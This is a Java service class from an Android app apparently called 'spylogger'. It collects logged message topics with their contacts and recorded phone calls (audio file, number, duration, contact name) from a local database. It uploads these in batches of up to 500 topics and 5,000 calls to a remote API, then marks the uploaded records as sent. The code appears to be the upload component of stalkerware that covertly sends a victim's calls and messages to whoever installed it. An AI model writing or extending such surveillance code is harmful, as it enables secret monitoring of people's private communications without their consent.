package com.gravatasufoca.spylogger.services;

import android.content.Context;
import android.util.Log;

import com.gravatasufoca.spylogger.dao.DatabaseHelper;
import com.gravatasufoca.spylogger.helpers.TaskComplete;
import com.gravatasufoca.spylogger.model.Ligacao;
import com.gravatasufoca.spylogger.model.TipoMensagem;
import com.gravatasufoca.spylogger.model.Topico;
import com.gravatasufoca.spylogger.vos.ContatoVO;
import com.gravatasufoca.spylogger.vos.RespostaRecebimentoVO;
import com.j256.ormlite.dao.Dao;
import com.j256.ormlite.dao.GenericRawResults;
import com.j256.ormlite.field.DataType;
import com.j256.ormlite.stmt.UpdateBuilder;

import java.sql.SQLException;
import java.util.ArrayList;
import java.util.Date;
import java.util.Iterator;
import java.util.List;

import retrofit2.Call;
import retrofit2.Response;

/**
 * Created by bruno on 02/12/16.
 */

public class SendGravacoesService extends SendDataService<RespostaRecebimentoVO> {
    private Context context;

    private Integer MAX_TOPICOS=500;
    private Integer MAX_MENSAGENS=5000;

    private List<ContatoVO> contatos;
    List<ContatoVO> contatoVOs=new ArrayList<>();

    public SendGravacoesService(Context context, TaskComplete handler) {
        super(handler);
        this.context = context;
    }


    public boolean enviarTopicos() {
        DatabaseHelper dbHelper = new DatabaseHelper(context);
        try {
            Dao<Topico, Integer> daoTopicos = dbHelper.getDao(Topico.class);
            GenericRawResults<String[]> raws = daoTopicos.queryRaw("select id,nome,grupo,tipoMensagem,(select group_concat(contato,'#') from ( select distinct contato from mensagem where topico_id=top.id)) from topico top where top.enviado=0 ");

            List<Topico> topicos = new ArrayList<>();
            int contador = 0;
            Iterator<String[]> iterator = raws.iterator();
            if(iterator.hasNext()) {
                while (iterator.hasNext()) {
                    String[] resultRaw = iterator.next();
                    Topico topico = new Topico.TopicoBuilder()
                            .setId(Integer.valueOf(resultRaw[0]))
                            .setNome(resultRaw[1])
                            .setGrupo("1".equals(resultRaw[2]))
                            .build(TipoMensagem.values()[Integer.parseInt(resultRaw[3])]);

                    topicos.add(topico);
                    contador++;
                    if (iterator.hasNext()) {
                        if (contador == MAX_TOPICOS) {
                            contador = 0;
                            enviarTopicos(topicos);
                            topicos = new ArrayList<>();
                        }
                    } else {
                        enviarTopicos(topicos);
                    }
                }
            }else{
                enviarLigacoes();
            }

        } catch (SQLException e) {
            Log.e(this.getClass().getSimpleName(), e.getMessage());
        }

        return true;
    }

    private void enviarLigacoes(){
        DatabaseHelper dbHelper = new DatabaseHelper(context);
        try {
            Dao<Ligacao, Integer> daoMensagem = dbHelper.getDao(Ligacao.class);

            GenericRawResults<Object[]> raws = daoMensagem.queryRaw("select id,data,audio,numero,remetente,duracao,nome,topico_id from ligacao where enviado=0",
                    new DataType[]{DataType.INTEGER,DataType.DATE_LONG,DataType.STRING,DataType.STRING,DataType.BOOLEAN_INTEGER,DataType.LONG,DataType.STRING,DataType.INTEGER});
            List<Ligacao> ligacoes = new ArrayList<>();
            int contador = 0;
            Iterator<Object[]> iterator = raws.iterator();
            while (iterator.hasNext()) {
                Object[] resultRaw = iterator.next();
                try {

                    Ligacao ligacao=new Ligacao();
                    ligacao.setId((Integer) resultRaw[0]);
                    ligacao.setData((Date) resultRaw[1]);
                    ligacao.setAudio((String) resultRaw[2]);
                    ligacao.setNumero((String) resultRaw[3]);
                    ligacao.setRemetente((Boolean) resultRaw[4]);
                    ligacao.setDuracao((Long) resultRaw[5]);
                    ligacao.setNome((String) resultRaw[6]);
                    ligacao.setTopico(new Topico.TopicoBuilder().setId((Integer) resultRaw[7]).build(TipoMensagem.AUDIO));

                    ligacoes.add(ligacao);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                contador++;
                if (iterator.hasNext()) {
                    if (contador == MAX_MENSAGENS) {
                        contador = 0;
                        enviarLigacoes(ligacoes);
                        ligacoes = new ArrayList<>();
                        break;
                    }
                } else {
                    enviarLigacoes(ligacoes);
                }
            }
        }catch (SQLException e){
            e.printStackTrace();
        }
    }


    private void enviarLigacoes(List<Ligacao> ligacoes) {
        Call<RespostaRecebimentoVO> resp = sendApi.enviarLigacoes(ligacoes);
        resp.enqueue(this);
    }

    private void enviarTopicos(List<Topico> topicos) {
        Call<RespostaRecebimentoVO> resp = sendApi.enviarTopicos(topicos);
        resp.enqueue(this);
    }

    @Override
    public void onResponse(Call<RespostaRecebimentoVO> call, Response<RespostaRecebimentoVO> response) {
        final RespostaRecebimentoVO resposta = response.body();

        if (resposta != null) {
            try {
                DatabaseHelper dbHelper = new DatabaseHelper(context);

                if (resposta.getTipo().equalsIgnoreCase("topico")) {
                    Dao<Topico, Integer> daoTopicos = dbHelper.getDao(Topico.class);

                    final UpdateBuilder<Topico, Integer> ub = daoTopicos.updateBuilder();
                    ub.where().in("id", resposta.getIds());
                    ub.updateColumnValue("enviado", true);
                    ub.update();
                    enviarLigacoes();
                } else {
                    if (resposta.getTipo().equalsIgnoreCase("ligacao")) {

                        Dao<Ligacao, Integer> daoLigacao = dbHelper.getDao(Ligacao.class);
                        UpdateBuilder<Ligacao, Integer> ub = daoLigacao.updateBuilder();
                        ub.where().in("id", resposta.getIds());
                        ub.updateColumnValue("enviado", true);
                        ub.update();

                        enviarLigacoes();
                    }
                }


            } catch (SQLException e) {
                Log.e(this.getClass().getSimpleName(), e.getMessage());
            }
        }
    }
}
